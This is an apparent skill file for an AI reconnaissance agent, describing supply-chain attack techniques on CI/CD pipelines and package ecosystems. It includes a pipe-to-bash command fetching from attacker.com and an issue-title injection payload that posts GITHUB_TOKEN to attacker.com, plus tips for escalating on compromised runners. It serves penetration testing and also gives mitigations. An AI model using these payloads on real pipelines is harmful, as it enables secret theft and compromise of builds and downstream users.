<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: supply-chain
description: Exploitation techniques targeting CI/CD pipelines, package ecosystems, dependency confusion, and build infrastructure.
---

# Supply Chain Vulnerabilities

Supply chain attacks target the software development lifecycle (SDLC), tools, and external dependencies used by an organization rather than attacking the production application directly. A successful supply chain attack can compromise thousands of downstream consumers simultaneously (e.g., SolarWinds, Codecov). 

These vulnerabilities often manifest in CI/CD pipelines, source code repositories, and dependency management systems.

## 1. Dependency Confusion & Typosquatting

Organizations often use proprietary, internal packages alongside public open-source packages from registries like npm, PyPI, or RubyGems.

### A. Dependency Confusion Attack
If an organization's internal package manager (e.g., Jenkins, Artifactory) is misconfigured to check a public registry *before* the internal registry, or if it queries both and favors the higher version number, an attacker can hijack the build process.

1.  **Reconnaissance:** Analyze public `package.json`, `requirements.txt`, or exposed build logs to identify the names of internal, scoped, or private packages (e.g., `@acme-corp/auth-lib`).
2.  **Exploitation:** The attacker registers a package with the *exact same name* on the public registry (e.g., npmjs.com), giving it an artificially high version number (e.g., `99.99.99`).
3.  **Execution:** When the victim's CI/CD pipeline runs `npm install`, the package manager pulls the malicious package from the public registry due to the high version number, executing arbitrary code (via `preinstall` or `postinstall` scripts) on the build server.

### B. Typosquatting
Similar to domain typosquatting, attackers register public packages with names closely resembling popular legitimate packages (e.g., registering `react-domm` instead of `react-dom` or `python-urllib3` instead of `urllib3`).
- **Impact:** Developers accidentally typing the wrong name execute malicious pre-install hooks, resulting in workstation compromise or credential theft.

---

## 2. CI/CD Pipeline Exploitation (GitHub Actions, GitLab CI)

CI/CD pipelines (Jenkins, GitHub Actions, GitLab CI) inherently hold highly privileged secrets (AWS access keys, SSH deployment keys, registry tokens) and have direct write access to production environments.

### A. Malicious Pull Requests (PRs)
Many open-source repositories run automated tests (linting, building, unit tests) when a Pull Request is submitted from a fork.

1.  **The Attack:** An attacker forks a repository and submits a PR containing malicious code within test files, configuration files (e.g., `tox.ini`, `package.json` scripts), or the build scripts themselves.
2.  **Execution:** If the CI/CD pipeline automatically executes untrusted code from PRs without requiring approval (e.g., GitHub Actions `pull_request_target` event instead of `pull_request`), the malicious code runs on the organization's build runner.
3.  **Exfiltration:** The attacker's code dumps environment variables `env > out.txt` and exfiltrates the repository's secrets/tokens to an external server.

### B. Poisoned Pipeline Execution (PPE)
If a developer can push code to a branch, they can modify the `.github/workflows/deploy.yml` or `Jenkinsfile` itself.

-   **Direct PPE:** An attacker with write access changes the build steps to `curl http://attacker.com/malware.sh | bash`. This compromises the build agent, allowing lateral movement into the network or theft of hardcoded deployment secrets.
-   **Indirect PPE:** Modifying the pipeline configuration to alter the deployment destination or upload malicious artifacts instead of the genuine build output.

### C. Runner Takeover (Self-Hosted Runners)
Organizations often use self-hosted CI/CD runners (e.g., an AWS EC2 instance running the GitLab Runner agent) rather than shared cloud runners.
-   If an attacker achieves RCE via a malicious PR on a persistent self-hosted runner, they can escape the container (if applicable) and compromise the host infrastructure, gaining access to the internal network and long-lived cloud credentials (IMDS).
-   Cloud runners are ephemeral (destroyed after the job); self-hosted runners are often reused, meaning malware persists across build jobs.

---

## 3. GitHub Actions Specific Exploits

### A. Command Injection / Context Injection
Unsanitized user input flowing into GitHub workflow execution blocks.

**Vulnerable Example:**
```yaml
steps:
  - run: echo "Issue title: ${{ github.event.issue.title }}"
```
**Exploit:**
An attacker creates a GitHub Issue titled: `Title"; curl -X POST -d "$GITHUB_TOKEN" http://attacker.com; echo "x`.
When the workflow runs, the YAML evaluates to:
`echo "Issue title: Title"; curl -X POST -d "$GITHUB_TOKEN" http://attacker.com; echo "x"`
The attacker steals the dynamically generated `GITHUB_TOKEN`.

**Mitigation:**
Always use environment variables for untrusted input:
```yaml
env:
  TITLE: ${{ github.event.issue.title }}
steps:
  - run: echo "Issue title: $TITLE"
```

### B. Third-Party Action Compromise
Workflows often rely on actions maintained by random third parties (e.g., `uses: untrusted-dev/cool-action@v1`). If that action's repository is compromised or the maintainer goes rogue, any pipeline relying on `@v1` automatically pulls the malicious code during the next build.

---

## 4. Source Code and Artifact Compromise

### A. Compromising Upstream Repositories
Attackers target the core infrastructure of open-source projects or SaaS vendors.
1.  Stealing maintainer credentials (weak passwords, missing 2FA).
2.  Pushing malicious commits silently.
3.  Downstream users pull the compromised updates naturally.

### B. Artifact Tampering
If the build process signs artifacts (e.g., Docker images, JAR files), but the signing key is loosely protected, or the verification steps downstream are flawed, an attacker can replace legitimate binaries on an artifact repository (like Nexus or Artifactory) with backdoored versions.

---

## 5. Secret Leaks & Hardcoded Credentials

The most common "supply chain" vulnerability is simply developers leaving keys in the codebase.
-   AWS Keys, Database passwords, or API Keys committed to `.git` history.
-   Attackers use tools like `trufflehog` or `gitleaks` to scan public or leaked repositories. Once a key is found, the attacker uses it to pivot into the cloud infrastructure or production databases, bypassing the application layer entirely.

## Tooling & Methodology

```bash
# Recon and Secret Scanning
trufflehog git https://github.com/target/repo
gitleaks detect --source . -v

# Dependency Vulnerability Scanning
npm audit
retire.js
safety check # for Python

# CI/CD Security Posture
Legitify # Checks GitHub/GitLab org/repo configurations for security issues
```

## Critical Pro Tips

1.  **Look for the `pull_request_target` Trigger (GitHub):** This event runs the workflow in the context of the *base* repository, not the fork, giving it access to repository secrets. It is incredibly dangerous if it checks out untrusted code or passes untrusted data to a `run` block.
2.  **Analyze `package-lock.json` and `yarn.lock`:** Don't just look at dependencies; look at where they are resolved from. Sometimes developers accidentally resolve packages to an insecure mirror (`http://...`) opening the door for MITM attacks during the build process.
3.  **Assume the Runner is Root:** When exploiting a CI/CD runner, assume you have maximum privileges over that machine. Treat it like a standard internal penetration test. Run linPEAS, check Docker sockets (`/var/run/docker.sock`), and query cloud metadata APIs immediately.
4.  **GitHub Token Enumeration:** If you extract the automatic `GITHUB_TOKEN` from a workflow, remember its permissions are determined by repository settings. It might only have read access, but it could have the power to create new releases, approve PRs, or modify repository settings.
